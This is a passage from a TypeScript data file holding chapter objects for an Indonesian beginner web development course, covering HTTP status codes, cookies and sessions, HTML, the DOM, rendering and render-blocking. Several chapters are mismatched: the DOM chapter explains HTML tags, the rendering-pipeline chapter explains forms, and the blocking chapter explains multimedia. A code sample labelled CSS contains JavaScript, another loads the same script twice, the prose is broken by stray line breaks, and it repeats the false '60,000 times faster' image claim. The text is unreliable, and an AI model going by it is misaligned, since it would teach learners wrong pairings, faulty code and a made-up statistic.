atau data sudah dihapus.\\n- **422 Unprocessable Entity** → Request valid tapi tidak bisa diproses karena validasi bisnis gagal.\\n\\n**5xx — Server Error (Salah dari Server)**\\nAda yang salah dari sisi server. Ini bukan salah kamu — server yang mengalami masalah.\\n- **500 Internal Server Error** → Server crash atau ada bug di kode server. Developer harus memperbaiki ini.\\n- **502 Bad Gateway** → Server utama dapat respons buruk dari server lain (misalnya database server mati).\\n- **503 Service Unavailable** → Server sibuk atau sedang maintenance.\n\nCoba lagi nanti.\\n\\n**Kenapa ini penting?** Karena sebagai developer, kamu akan menghabiskan banyak waktu men-debug masalah. Status code adalah petunjuk pertama yang membantumu mengidentifikasi di mana masalahnya — di client, di server, atau di jaringan. Memahami status code juga penting saat membangun API — kamu harus mengembalikan status code yang tepat agar client bisa menangani responsenya dengan benar.",

    codeExample: {

      language: "javascript",

      code: "// ====== Handle Status Code ======\nconst fetchData = async () => {\n  try {\n    const res = await fetch('/api/data');\n    \n    switch (res.status) {\n      case 200:\n        const data = await res.json();\n        console.log('Sukses:', data);\n        return data;\n        \n      case 401:\n        console.error('Silakan login dulu!');\n        window.location.href = '/login';\n        break;\n        \n      case 403:\n        console.error('Kamu tidak punya izin akses ini.');\n        break;\n        \n      case 404:\n        console.error('Data tidak ditemukan.');\n        break;\n        \n      case 500:\n        console.error('Server error. Coba lagi nanti.');\n        break;\n        \n      default:\n        console.error('Error tidak dikenal:', res.status);\n    }\n  } catch (err) {\n    console.error('Network error:', err);\n  }\n};",

    },

    explainAlong: "Baris 4: Fetch data dari API. Baris 6-25: Switch case berdasarkan status code. Baris 27-28: Catch block untuk network error.",

    aiPrompt: "Jelaskan bedanya status code 401 dan 403. Kapan menggunakan 301 vs 302? Apa yang terjadi kalau server mengirim status code 418?",

    reflection: "Buka website manapun → DevTools → Network → pilih request → lihat status code. Coba akses halaman yang tidak ada (tambahkan /xxx di URL). Status code-nya berapa? Apa artinya?",

  },

  {

    id: "1.6",

    moduleId: 1,

    chapterNum: "1.6",

    title: "HTTP Stateless dan Cara Kerja Session",

    subtitle: "Konsep stateless, cookie, dan session management",

    level: "Pemula",

    objectives: [

      "Memahami konsep stateless dalam HTTP",

      "Mengerti cara kerja cookie dan session",

    ],

    analogy: {

      diagram: "HTTP Stateless = Kasir Restoran yang Punya Amnesia:\n\nKamu: \"Pesan nasi goreng\"\nKasir: \"Oke, ini pesananmu!\" (LUPA)\nKamu: \"Tambah es teh\"\nKasir: \"Maaf, siapa kamu? Pesan apa tadi?\"\n\nSOLUSI: Token/Cookie = Struk Pesanan dengan Nomor:\nKasir: \"Ini struk nomor #42. Tanya aja nomor ini.\"\nKamu: \"Pesanan nomor 42, tambah es teh\"\nKasir: \"Oke, nasi goreng + es teh untuk nomor 42!\"",

      caption: "Cookie = struk pesanan dengan nomor, supaya server ingat siapa kamu",

    },

    explanation: "Ada satu karakteristik unik HTTP yang harus kamu pahami: HTTP itu **stateless** (tanpa keadaan). Apa artinya? Artinya, setiap request yang kamu kirim ke server dianggap sebagai request yang sepenuhnya independen. Server tidak secara otomatis mengingat request sebelumnya.\n\nIni seperti pelayan restoran yang punya amnesia — setiap kali kamu bicara,\n\nDia lupa siapa kamu dan apa yang sudah kamu pesan sebelumnya.\\n\\n**Kenapa HTTP dibuat stateless?** Ada beberapa alasan bagus.\n\nPertama, stateless membuat server lebih sederhana dan tidak perlu menyimpan informasi setiap client di memori — ini sangat penting karena sebuah server bisa melayani ribuan atau jutaan client secara bersamaan.\n\nBayangkan kalau server harus mengingat setiap interaksi dengan setiap user yang pernah terkoneksi — memorinya akan cepat penuh!\n\nKedua, stateless membuat sistem lebih reliable.\n\nKalau satu server mati, request bisa dialihkan ke server lain tanpa khawatir kehilangan \\\"status\\\" karena setiap request sudah lengkap dengan semua informasi yang dibutuhkan.\\n\\nTapi di dunia nyata, kita BUTUH server mengingat siapa kita.\n\nKalau kamu login ke Facebook, kamu nggak mau kan setiap klik link harus login ulang?\n\nKalau kamu belanja di Tokopedia dan tambah barang ke keranjang, keranjangnya harus tetap ada walaupun kamu pindah halaman.\n\nNah, disinilah teknologi **cookie** dan **session** berperan.\\n\\n**Cookie: Kartu Member Digital**\\nCookie adalah data kecil yang server kirim ke browser,\n\nDan browser akan menyimpannya serta mengirimkannya kembali di setiap request berikutnya ke domain yang sama.\n\nBayangkan cookie seperti kartu member di restoran — setelah kamu daftar, kamu dapat kartu. Setiap kali kamu datang, kamu tunjukkan kartu itu dan pelayan langsung tahu siapa kamu, apa preferensimu, dan poin loyalty-mu berapa.\\n\\nCara kerja cookie:\\n1. Kamu login ke website → server buat session di server-side → kirim session ID lewat cookie ke browser.\\n2. Browser simpan cookie tersebut (biasanya di file kecil di komputermu).\\n3.\n\nSetiap request berikutnya ke website yang sama, browser otomatis kirim cookie tersebut di header.\\n4.\n\nServer terima cookie → baca session ID → cari data session di memory/database → tahu siapa kamu.\\n\\n**Session: Lemari Arsip Server**\\nSession adalah data yang disimpan di server yang berisi informasi tentang user yang sedang login.\n\nSession ID (biasanya random string seperti `a3f7b2d9e1`) adalah \\\"kunci\\\" yang menghubungkan cookie di browser dengan data session di server.\n\nSession bisa disimpan di memory server (cepat tapi hilang kalau server restart), di database Redis (paling umum untuk production), atau di database biasa.\\n\\n**Authentication vs Authorization**\\nDua konsep ini sering tertukar tapi sangat berbeda:\\n- **Authentication** = Membuktikan identitas. \\\"Siapa kamu?\\\" Proses login adalah authentication — kamu buktikan bahwa kamu memang Budi dengan memasukkan password yang benar.\\n- **Authorization** = Menentukan izin akses. \\\"Apa yang boleh kamu lakukan?\\\" Setelah server tahu kamu Budi,\n\nAuthorization menentukan apakah Budi boleh mengakses halaman admin atau tidak.\\n\\n**Cookie Attributes (Properti Cookie):**\\n- `HttpOnly`: Cookie tidak bisa diakses oleh JavaScript (melindungi dari XSS attack).\\n- `Secure`: Cookie hanya dikirim melalui HTTPS (aman dari sniffing).\\n- `SameSite`: Mengontrol kapan cookie dikirim ke website lain (melindungi dari CSRF attack).\\n- `Max-Age/Expires`: Menentukan kapan cookie kadaluarsa.\\n- `Domain` dan `Path`: Menentukan scope cookie — cookie mana yang dikirim ke URL apa.\\n\\n**Kenapa memahami ini penting?** Karena setiap aplikasi web yang memiliki fitur login menggunakan mekanisme ini.\n\nMemahami cookie, session, dan perbedaan authentication-authorization akan membantumu membangun sistem yang aman dan scalable. Keamanan web modern — dari JWT token hingga OAuth — semuanya dibangun di atas fondasi konsep stateless HTTP dan solusi cookie-session ini.",

    codeExample: {

      language: "javascript",

      code: "// ====== Set dan Get Cookie di JavaScript ======\n// Set cookie (expire dalam 7 hari)\ndocument.cookie = \"sessionId=abc123; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/\";\n\n// Baca semua cookie\nconsole.log(document.cookie);  // \"sessionId=abc123; token=xyz789\"\n\n// ====== localStorage (alternatif cookie) ======\n// Simpan data di browser (tidak expired kecuali dihapus)\nlocalStorage.setItem('user', JSON.stringify({ nama: 'Budi', id: 123 }));\nconst user = JSON.parse(localStorage.getItem('user'));\nconsole.log(user.nama);  // \"Budi\"\n\n// sessionStorage (hilang saat tab ditutup)\nsessionStorage.setItem('tempData', 'ini data sementara');",

    },

    explainAlong: "Baris 2-3: Set cookie dengan expiration. Baris 6: Baca cookie. Baris 9-12: localStorage untuk data persisten. Baris 15: sessionStorage untuk data sementara.",

    aiPrompt: "Jelaskan perbedaan cookie, localStorage, dan sessionStorage. Kapan menggunakan masing-masing? Apa risiko keamanan dari menyimpan token JWT di localStorage?",

    reflection: "Buka DevTools → Application → Cookies / Local Storage / Session Storage. Lihat data apa yang disimpan website favoritmu. Apakah ada informasi sensitif?",

  },

];



// ============================================================

// MODUL 2: Browser & Halaman Web (5 chapters)

// ============================================================

const modul2: Chapter[] = [

  {

    id: "2.1", moduleId: 2, chapterNum: "2.1", title: "Tiga Pilar Web: HTML, CSS, dan JavaScript", subtitle: "Peran masing-masing teknologi dan hubungannya", level: "Pemula",

    objectives: ["Memahami peran HTML, CSS, dan JavaScript", "Bisa membedakan fungsi masing-masing teknologi"],

    analogy: { diagram: "Rumah = Halaman Web:\n\nHTML = Struktur (Kerangka Rumah)\n  - Dinding, pintu, jendela\n\nCSS = Gaya (Cat dan Dekorasi)\n  - Warna cat, ukuran jendela\n\nJS = Interaksi (Listrik dan Peralatan)\n  - Lampu yang bisa dinyalakan", caption: "HTML = struktur, CSS = tampilan, JS = interaksi — seperti kerangka, cat, dan listrik rumah" },

    explanation: "Selamat datang di dunia coding!\n\nKalau di chapter sebelumnya kita belajar cara kerja internet dari sudut pandang \\\"pengguna,\\\" sekarang kita mulai belajar dari sudut pandang \\\"pembuat.\\\" Dan bahasa pertama yang harus dikuasai setiap web developer adalah **HTML (HyperText Markup Language)**.\n\nHTML adalah fondasi dari setiap halaman web yang pernah kamu buka — dari Google sampai Facebook,\n\nDari Wikipedia sampai website ini — semuanya dibangun di atas HTML.\\\n\\\n**Jadi, apa itu HTML?** HTML bukan bahasa pemrograman.\n\nHTML adalah **bahasa markup** — bahasa yang digunakan untuk memberi \\\"makna\\\" dan \\\"struktur\\\" pada konten.\n\nBayangkan kamu menulis esai di Microsoft Word. Kamu bisa membuat judul besar, subjudul, paragraf, daftar, tabel, dan lainnya. HTML melakukan hal yang sama — tapi untuk halaman web. HTML memberitahu browser: \\\"Ini adalah judul utama,\\\" \\\"Ini adalah paragraf,\\\" \\\"Ini adalah gambar,\\\" dan \\\"Ini adalah link ke halaman lain.\\\"\\\n\\\n**Sejarah singkat HTML** akan membantumu memahami mengapa HTML bentuknya seperti sekarang.\n\nHTML diciptakan oleh Tim Berners-Lee pada tahun 1991 di CERN (laboratorium fisika di Swiss). Tujuannya sederhana: memungkinkan ilmuwan berbagi dokumen penelitian melalui internet. Versi pertama HTML sangat sederhana — cuma 18 tag saja. Seiring waktu, HTML berkembang: HTML 2.0 (1995), HTML 4.01 (1999), lalu XHTML (yang terlalu ketat dan tidak populer), dan akhirnya **HTML5** (2014) yang menjadi standar sampai sekarang.\n\nHTML5 membawa fitur modern seperti video, audio, canvas,\n\nDan semantic elements yang membuat web jauh lebih kaya.\\\n\\\n**Struktur Dasar Dokumen HTML5:**\\\nSetiap dokumen HTML dimulai dengan `<!DOCTYPE html>` — ini memberitahu browser bahwa dokumen ini menggunakan HTML5.\n\nLalu ada tag `<html>` yang menjadi elemen paling luar (root element).\n\nDi dalam `<html>` ada dua bagian utama:\\\n\\\n**1.\n\n`<head>` — Bagian Kepala (Tidak Terlihat)**\\\nHead berisi informasi tentang dokumen yang tidak ditampilkan langsung di halaman.\n\nIni seperti blueprint atau spesifikasi teknis rumah — penting tapi tidak dilihat pengunjung.\n\nIsi head meliputi:\\\n- `<title>`: Judul halaman yang muncul di tab browser\\\n- `<meta charset=\\\"UTF-8\\\">`: Menentukan encoding karakter (penting untuk bahasa Indonesia!)\\\n- `<meta name=\\\"viewport\\\" content=\\\"width=device-width,\n\nInitial-scale=1.0\\\">`: Agar halaman responsif di HP\\\n- `<meta name=\\\"description\\\">`: Deskripsi untuk Google search\\\n- `<link rel=\\\"stylesheet\\\">`: Menyambungkan file CSS\\\n- `<script src=\\\"...\\\">`: Menyambungkan file JavaScript\\\n\\\n**2.\n\n`<body>` — Bagian Tubuh (Terlihat)**\\\nBody berisi semua konten yang dilihat user — teks, gambar, video, link, form, dan lainnya.\n\nIni adalah ruang tamu, kamar, dan dapur rumahmu — semua yang bisa dilihat dan diinteraksi pengunjung.\\\n\\\n**Tag, Element, dan Attribute:**\\\n- **Tag**: Penanda dengan tanda kurung sudut,\n\n`<p>`, `</p>`, `<img>`.",

    codeExample: { language: "html", code: "<!DOCTYPE html>\n<html>\n<head>\n  <title>Belajar Web</title>\n  <style>\n    body {\n      font-family: Arial, sans-serif;\n      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n      color: white;\n      text-align: center;\n      padding: 50px;\n    }\n    button {\n      padding: 15px 30px;\n      font-size: 18px;\n      border: none;\n      border-radius: 25px;\n      background: #ff6b6b;\n      color: white;\n      cursor: pointer;\n    }\n  </style>\n</head>\n<body>\n  <h1>Halo, Dunia Web!</h1>\n  <p>Klik tombol di bawah</p>\n  <button id=\"tombolAjaib\">Klik Aku!</button>\n  <p id=\"pesan\"></p>\n  <script>\n    const tombol = document.getElementById('tombolAjaib');\n    const pesan = document.getElementById('pesan');\n    tombol.addEventListener('click', () => {\n      pesan.textContent = 'JavaScript berhasil!';\n      pesan.style.color = '#ffd700';\n    });\n  </script>\n</body>\n</html>" },

    explainAlong: "Baris 7-18: CSS styling. Baris 22-24: HTML struktur. Baris 28-33: JavaScript event listener.",

    aiPrompt: "Jelaskan mengapa CSS disebut 'Cascading' Style Sheets. Apa yang terjadi kalau ada konflik styling?", reflection: "Nonaktifkan JavaScript di browser. Lalu buka website favoritmu. Apa yang berubah?"

  },

  {

    id: "2.2", moduleId: 2, chapterNum: "2.2", title: "DOM: Peta Interaktif Halaman Web", subtitle: "Document Object Model dan cara JavaScript memanipulasinya", level: "Pemula",

    objectives: ["Memahami konsep DOM sebagai representasi tree dari HTML", "Bisa memanipulasi elemen HTML dengan JavaScript"],

    analogy: { diagram: "DOM = Peta Genalogi Keluarga:\n\n        Document (Kakek)\n            |\n        <html> (Ayah)\n           /    \\\n    <head>      <body> (Ibu)\n      |          /    |    \\\n   <title>   <h1>  <p>   <button>", caption: "DOM tree seperti pohon keluarga — setiap elemen punya parent dan children" },

    explanation: "Setelah memahami struktur dasar HTML, sekarang kita akan kenalan dengan **tag-tag HTML yang paling sering dipakai** dalam sehari-hari.\n\nSeperti tukang bangunan yang harus tahu fungsi setiap alat — palu untuk memaku, gergaji untuk memotong,\n\nPenggaris untuk mengukur — web developer juga harus tahu kapan menggunakan tag yang tepat.\n\nTag yang tepat memberikan makna yang tepat, dan makna yang tepat membuat website-mu lebih baik di mata Google dan lebih mudah diakses oleh semua orang.\\n\\n**Heading `<h1>` sampai `<h6>`: Hierarki Judul**\\nHeading adalah judul atau subjudul.\n\n`<h1>` adalah judul utama (paling besar, paling penting), `<h2>` adalah subjudul, hingga `<h6>` yang paling kecil.\n\nBayangkan ini seperti struktur bab dalam buku — ada judul buku, judul bab, subbab, dan sub-subbab. Setiap halaman seharusnya punya SATU `<h1>` saja (untuk SEO), lalu `<h2>` untuk bagian-bagian utama, dan `<h3>` untuk sub-bagian. Heading tidak boleh dipilih berdasarkan ukuran font — gunakan CSS untuk mengubah ukuran — tapi berdasarkan hierarki konten.\\n\\n**Paragraf `<p>`: Wadah Teks**\\nTag `<p>` digunakan untuk menampung blok teks. Setiap paragraf harus dibungkus dalam tag `<p>` sendiri.\n\nBrowser secara otomatis memberi jarak antar paragraf (margin).\n\nDi dalam paragraf, kamu bisa menggunakan tag inline seperti `<strong>` (tebal, penting), `<em>` (miring, penekanan), `<mark>` (highlight),\n\nDan `<a>` (link).\\n\\n**Link `<a>`: Jalan Penghubung**\\nTag `<a>` (anchor) membuat hyperlink — klik dan kamu pindah ke halaman lain.\n\nAttribute `href` menentukan tujuan link.\n\nAda beberapa jenis nilai href:\\n- URL absolut: `href=\\\"https://google.com\\\"` — ke website lain\\n- URL relatif: `href=\\\"/about.html\\\"` — ke halaman di website yang sama\\n- Anchor: `href=\\\"#section2\\\"` — ke bagian tertentu di halaman yang sama\\n- Email: `href=\\\"mailto:budi@email.com\\\"` — membuka email client\\n- Telepon: `href=\\\"tel:+628123456789\\\"` — langsung telepon di HP\\nAttribute `target=\\\"_blank\\\"` akan membuka link di tab baru.\\n\\n**Gambar `<img>`: Menampilkan Visual**\\nTag `<img>` menampilkan gambar.\n\nBerbeda dari kebanyakan tag, `<img>` tidak punya tag penutup — ini disebut **self-closing tag**.\n\nAttribute penting:\\n- `src`: Lokasi file gambar (URL atau path lokal)\\n- `alt`: Teks alternatif yang muncul kalau gambar gagal load,\n\nJuga dibaca screen reader\\n- `width` dan `height`: Dimensi gambar (lebih baik atur di CSS)\\nSelalu isi attribute `alt`!\n\nIni penting untuk aksesibilitas dan SEO.\\n\\n**List `<ul>`, `<ol>`, `<li>`: Membuat Daftar**\\nAda dua jenis list:\\n- `<ul>` (Unordered List): Daftar tanpa urutan — pakai bullet point.\n\nCocok untuk menu, daftar fitur.\\n- `<ol>` (Ordered List): Daftar berurutan — pakai angka.\n\nCocok untuk langkah-langkah, peringkat.\\nSetiap item dalam list dibungkus `<li>` (List Item).\n\nList juga bisa bersarang — `<li>` berisi `<ul>` lagi untuk sub-menu.\\n\\n**Tabel `<table>`, `<tr>`, `<td>`,\n\n`<th>`: Menyajikan Data**\\nTabel digunakan untuk data yang punya struktur baris-kolom (bukan untuk layout halaman — itu jadul!).\n\nStrukturnya:\\n- `<table>`: Wadah tabel\\n- `<thead>`: Bagian kepala tabel (kolom judul)\\n- `<tbody>`: Bagian isi tabel\\n- `<tr>`: Table Row (satu baris)\\n- `<th>`: Table Header (sel judul,\n\nOtomatis tebal dan center)\\n- `<td>`: Table Data (sel biasa)\\n\\n**Block vs Inline Elements**\\n- **Block**: Selalu mulai di baris baru, mengambil lebar penuh.\n\nContoh: `<div>`, `<p>`, `<h1>`, `<section>`\\n- **Inline**: Tidak mulai baris baru, hanya mengambil lebar seperlunya.\n\nContoh: `<span>`, `<a>`, `<strong>`, `<img>`\\nPemahaman ini penting karena mempengaruhi layout dan styling dengan CSS.",

    codeExample: { language: "javascript", code: "// SELEKSI ELEMEN\nconst judul = document.getElementById('judul');\nconst tombol = document.querySelector('.btn-primary');\nconst semuaLink = document.querySelectorAll('a');\n\n// MANIPULASI KONTEN\njudul.textContent = 'Judul Baru!';\njudul.innerHTML = '<em>Teks Miring</em>';\n\n// MANIPULASI STYLE\njudul.style.color = 'blue';\njudul.style.fontSize = '32px';\n\n// MEMBUAT ELEMEN BARU\nconst divBaru = document.createElement('div');\ndivBaru.className = 'alert alert-success';\ndivBaru.textContent = 'Data berhasil disimpan!';\ndocument.body.appendChild(divBaru);\n\n// EVENT LISTENER\ntombol.addEventListener('click', () => {\n  alert('Tombol diklik!');\n});" },

    explainAlong: "Baris 2-4: Empat cara seleksi elemen DOM. Baris 7-8: Manipulasi teks dan HTML. Baris 11-12: Ubah style CSS langsung. Baris 15-18: Buat elemen baru. Baris 21-23: Pasang event listener.",

    aiPrompt: "Jelaskan bedanya textContent, innerText, dan innerHTML. Kapan sebaiknya menggunakan masing-masing?", reflection: "Buka DevTools → Console. Ketik `document.body` dan `document.querySelectorAll('*').length` untuk melihat total elemen di halaman."

  },

  {

    id: "2.3", moduleId: 2, chapterNum: "2.3", title: "Rendering Pipeline: Dari Kode ke Pixel", subtitle: "Cara browser merender halaman: DOM, CSSOM, Render Tree, Layout, Paint", level: "Pemula",

    objectives: ["Memahami 5 langkah rendering pipeline browser", "Mengerti kenapa CSS dan JS bisa memperlambat rendering"],

    analogy: { diagram: "Rendering Pipeline = Pabrik Pembuat Poster:\n\n1. HTML → DOM        (Siapkan bahan mentah)\n2. CSS  → CSSOM      (Siapkan cat dan warna)\n3. DOM + CSSOM → Render Tree (Gambar sketsa)\n4. Layout            (Tentukan ukuran dan posisi)\n5. Paint             (Warnai dan finishing)\n6. Composite         (Gabungkan semua layer)", caption: "Browser seperti pabrik poster — memproses HTML dan CSS menjadi pixel di layar" },

    explanation: "Kalau website cuma menampilkan informasi tanpa bisa menerima input dari user, itu seperti TV — kamu cuma bisa lihat tapi nggak bisa berinteraksi. Form HTML adalah cara paling fundamental untuk membuat website menjadi **interaktif**. Form memungkinkan user mengisi data, memberikan feedback, mendaftar akun, melakukan pembelian, mencari konten, dan jutaan interaksi lainnya. Tanpa form, web hanyalah buku elektronik — statis dan satu arah.\\n\\n**Analoginya kayak formulir di bank atau kantor.** Kamu datang ke bank untuk buka rekening.\n\nPetugas kasih formulir yang harus diisi — nama, alamat, nomor KTP, tanda tangan. Formulir ini punya struktur: label yang menjelaskan apa yang harus diisi, kolom kosong untuk menulis, dan tombol submit untuk menyerahkan. Form HTML bekerja dengan cara yang persis sama.\\n\\n**Tag `<form>`: Wadah Formulir**\\nTag `<form>` adalah elemen pembungkus seluruh form. Ada dua attribute yang sangat penting:\\n- `action`: URL tempat data akan dikirim (contoh: `/register` atau `https://api.example.com/users`)\\n- `method`: Metode HTTP yang dipakai — `GET` atau `POST`.\n\nGET untuk pencarian/filter (data di URL), POST untuk data sensitif seperti password (data di body).\\n\\n**Tag `<input>`: Macam-macam Kolom Isian**\\nInput adalah tag serbaguna untuk menerima data user. Jenis input ditentukan oleh attribute `type`:\\n\\n- `type=\\\"text\\\"` — Teks bebas, satu baris. Untuk nama, username, alamat singkat.\\n- `type=\\\"email\\\"` — Khusus email. Browser otomatis validasi format email (@ dan domain).\\n- `type=\\\"password\\\"` — Teks tersembunyi (muncul titik-titik).\n\nUntuk password dan PIN.\\n- `type=\\\"number\\\"` — Hanya menerima angka. Bisa ditambah min, max, step.\\n- `type=\\\"tel\\\"` — Khusus nomor telepon. Di HP akan muncul keypad numerik.\\n- `type=\\\"date\\\"` — Picker tanggal. Browser tampilkan kalender.\\n- `type=\\\"checkbox\\\"` — Kotak centang (bisa pilih banyak).\n\nUntuk setuju syarat, pilih topping.\\n- `type=\\\"radio\\\"` — Tombol pilihan (hanya bisa pilih satu). Untuk jenis kelamin, metode pembayaran.\\n- `type=\\\"file\\\"` — Upload file. Bisa dibatasi tipe file dengan `accept`.\\n- `type=\\\"hidden\\\"` — Input tersembunyi dari user tapi tetap dikirim ke server.\\n- `type=\\\"submit\\\"` — Tombol kirim form.\\n- `type=\\\"reset\\\"` — Tombol mengosongkan form.\\n\\n**Tag `<label>`: Petunjuk yang Bisa Diklik**\\nLabel menjelaskan apa yang harus diisi di input. Attribute `for` menghubungkan label dengan input (berdasarkan `id` input).\n\nKeuntungan: kalau user klik label, input tersebut otomatis fokus.\n\nIni meningkatkan usability secara signifikan — area klik yang lebih besar,\n\nTerutama untuk checkbox dan radio.\\n\\n**Tag `<textarea>`: Kolom Teks Panjang**\\nUntuk teks yang panjang — seperti komentar, deskripsi, atau alamat lengkap.\n\nBedanya dengan input text: textarea bisa multi-baris dan bisa di-resize oleh user.\n\nAttribute `rows` dan `cols` menentukan ukuran awal, `placeholder` menampilkan teks petunjuk.\\n\\n**Tag `<select>` dan `<option>`: Dropdown**\\nMembuat menu dropdown.\n\nUser klik dan pilih dari daftar opsi. Bisa ditambah attribute `multiple` untuk memilih lebih dari satu.\\n\\n**Attribute Penting untuk Validasi:**\\n- `required`: Field wajib diisi\\n- `placeholder`: Teks petunjuk di dalam input (hilang saat user mulai mengetik)\\n- `minlength` dan `maxlength`: Batas panjang karakter\\n- `min` dan `max`: Batas nilai numerik atau tanggal\\n- `pattern`: Regex untuk validasi format (misalnya pola nomor telepon Indonesia)\\n\\n**Kenapa Form Penting?** Karena form adalah jembatan antara user dan server. Setiap kali kamu login, daftar akun, beli barang online, kirim pesan, atau bahkan like foto di Instagram — semuanya melibatkan form. Memahami form HTML yang baik adalah keterampilan fundamental yang akan kamu pakai setiap hari sebagai web developer.",

    codeExample: { language: "css", code: "/* OPTIMASI RENDERING */\n\n/* 1. Hindari layout thrashing */\n/* JANGAN: Baca lalu tulis DOM berulang */\nconst h = element.offsetHeight;\nelement.style.height = (h * 2) + 'px';\nconst newH = element.offsetHeight; /* Layout lagi! */\n\n/* LAKUKAN: Batch read, lalu batch write */\nconst h = element.offsetHeight;\nconst w = element.offsetWidth;\nelement.style.height = (h * 2) + 'px';\nelement.style.width = (w * 2) + 'px';\n\n/* 2. Gunakan transform dan opacity */\n.animasi {\n  transform: translateX(100px);\n  opacity: 0.5;\n}\n\n/* 3. will-change untuk elemen yang sering berubah */\n.animated-element {\n  will-change: transform, opacity;\n}" },

    explainAlong: "Baris 4-6: Anti-pattern layout thrashing. Baris 9-12: Pattern yang benar. Baris 16-19: Gunakan transform dan opacity. Baris 22-24: will-change hint.",

    aiPrompt: "Jelaskan apa itu 'layout thrashing' dan kenapa itu buruk untuk performa.", reflection: "Buka Chrome DevTools → Performance → Record → Refresh halaman → Stop. Lihat timeline rendering."

  },

  {

    id: "2.4", moduleId: 2, chapterNum: "2.4", title: "Blocking vs Non-Blocking: CSS dan JavaScript", subtitle: "Cara CSS dan JS memperlambat render dan solusinya", level: "Pemula",

    objectives: ["Memahami konsep render-blocking dan parser-blocking", "Bisa mengoptimasi loading CSS dan JS"],

    analogy: { diagram: "Blocking = Macet di Jalan Tol:\n\nJalur A (Blocking):\n[Mobil A] → [Mobil B] → [Mobil C]\nSemua harus tunggu mobil depan\n\nJalur B (Non-Blocking):\n[Mobil A] [Mobil B] [Mobil C]\nSemua jalan bersamaan!", caption: "Blocking = satu persatu, non-blocking = bersamaan" },

    explanation: "Bayangkan kamu masuk ke sebuah rumah yang isinya cuma teks — dinding polos, tidak ada lukisan, tidak ada musik, tidak ada TV. Membosankan, kan? Website yang hanya berisi teks dan link juga terasa membosankan. Manusia adalah makhluk visual — kita lebih mudah mengingat informasi yang disajikan dengan gambar, suara, dan video.\n\nStudi menunjukkan bahwa otak manusia memproses gambar 60.000 kali lebih cepat daripada teks!\n\nItulah mengapa kemampuan menyematkan multimedia adalah keterampilan penting bagi setiap web developer.\\n\\n**Gambar `<img>`: Menampilkan Visual**\\nKita sudah singgung `<img>` di chapter sebelumnya, tapi mari kita bedah lebih dalam.\n\nTag `<img>` adalah self-closing tag (tidak perlu `</img>`).\n\nAttribute penting:\\n- `src`: Lokasi gambar — bisa URL absolut (`https://example.com/foto.jpg`), URL relatif (`/images/foto.jpg`), atau data URI\\n- `alt`: Teks alternatif — muncul kalau gambar gagal load,\n\nDibaca screen reader untuk tunanetra, dan dibaca Google untuk SEO\\n- `loading=\\\"lazy\\\"`: Teknik lazy loading — gambar baru di-load saat user scroll mendekatinya.\n\nIni sangat meningkatkan performa halaman!\\n- `width` dan `height`: Dimensi asli gambar — membantu browser mengalokasikan ruang sebelum gambar selesai load (mencegah layout shift)\\n\\nFormat gambar untuk web:\\n- **JPEG/JPG**: Untuk foto — kompresi bagus, ukuran kecil, tapi tidak transparan\\n- **PNG**: Untuk gambar dengan transparansi — logo, ikon, screenshot\\n- **GIF**: Untuk animasi sederhana — tapi ukuran besar,\n\nPertimbangkan video sebagai alternatif\\n- **SVG**: Untuk ikon dan logo — berbasis vektor (tidak pecah saat diperbesar), ukuran sangat kecil\\n- **WebP**: Format modern Google — kompresi lebih baik dari JPEG dan PNG, tapi belum semua browser mendukung\\n\\n**Audio `<audio>`: Menambahkan Suara**\\nTag `<audio>` digunakan untuk memutar file audio (MP3, WAV, OGG).\n\nAttribute penting:\\n- `controls`: Menampilkan tombol play/pause/volume\\n- `autoplay`: Memutar otomatis (banyak browser memblokir ini karena mengganggu user)\\n- `loop`: Mengulang terus menerus\\n- `preload`: Strategi preload — `auto` (load semua), `metadata` (hanya info), `none` (tidak preload)\\n\\nGunakan tag `<source>` di dalam `<audio>` untuk menyediakan beberapa format file,\n\nBrowser bisa memilih yang didukung:\\n`<audio controls><source src=\\\"lagu.mp3\\\" type=\\\"audio/mpeg\\\"><source src=\\\"lagu.ogg\\\" type=\\\"audio/ogg\\\"></audio>`\\n\\n**Video `<video>`: Menampilkan Video**\\nTag `<video>` mirip dengan audio tapi untuk file video (MP4, WebM, OGG).\n\nAttribute tambahan:\\n- `width` dan `height`: Dimensi player\\n- `poster`: Gambar thumbnail sebelum video diputar\\n- `muted`: Mulai dalam keadaan mute (sering dipakai untuk autoplay)\\n- `playsinline`: Memutar inline di iOS (tidak fullscreen otomatis)\\n\\nVideo adalah konten yang paling diminati di internet — YouTube, TikTok, Instagram Reels — semuanya berbasis video.\n\nMenyematkan video sendiri di website memberimu kontrol penuh atas konten dan pengalaman user.\\n\\n**`<iframe>`: Menyematkan Halaman Lain**\\niframe (inline frame) seperti jendela di rumahmu yang melihat ke rumah lain. iframe memuat halaman web lain di dalam halamanmu.\n\nContoh penggunaan umum:\\n- Embed Google Maps\\n- Embed YouTube video\\n- Embed payment gateway (Midtrans, Xendit)\\n- Embed social media feeds\\n\\nAttribute penting iframe:\\n- `src`: URL halaman yang akan dimuat\\n- `width` dan `height`: Dimensi iframe\\n- `frameborder`: Menghilangkan border (set ke 0)\\n- `allowfullscreen`: Memungkinkan mode fullscreen (untuk video)\\n- `sandbox`: Keamanan tambahan — membatasi apa yang bisa dilakukan konten iframe\\n\\n**Keamanan dengan iframe:** iframe bisa berisiko kalau tidak dikontrol. Gunakan attribute `sandbox` untuk membatasi kemampuan iframe — misalnya `sandbox=\\\"allow-scripts allow-same-origin\\\"`. Selalu pastikan kamu hanya embed konten dari sumber yang tepercaya.\\n\\n**Kenapa multimedia penting?** Karena web modern adalah pengalaman multisensori. User mengharapkan lebih dari sekadar teks — mereka ingin video tutorial, podcast, infografis interaktif, dan visual yang menarik.\n\nMenyajikan konten dalam format yang beragam juga meningkatkan engagement dan waktu yang dihabiskan user di website-mu. Tapi ingat: selalu optimalkan ukuran file media karena file besar memperlambat loading halaman.",

    codeExample: { language: "html", code: "<!DOCTYPE html>\n<html>\n<head>\n  <link rel=\"stylesheet\" href=\"style.css\">\n  <link rel=\"preload\" as=\"style\" href=\"non-critical.css\" \n        onload=\"this.rel='stylesheet'\">\n</head>\n<body>\n  <h1>Konten Halaman</h1>\n  <script src=\"app.js\"></script>\n  <script src=\"analytics.js\" async></script>\n  <script src=\"app.js\" defer></script>\n</body>\n</html>" },

    explainAlong: "Baris 4: CSS default = render blocking. Baris 5-6: Preload untuk CSS non-critical. Baris 9: Script di akhir body. Baris 10: Script async. Baris 11: Script defer.",

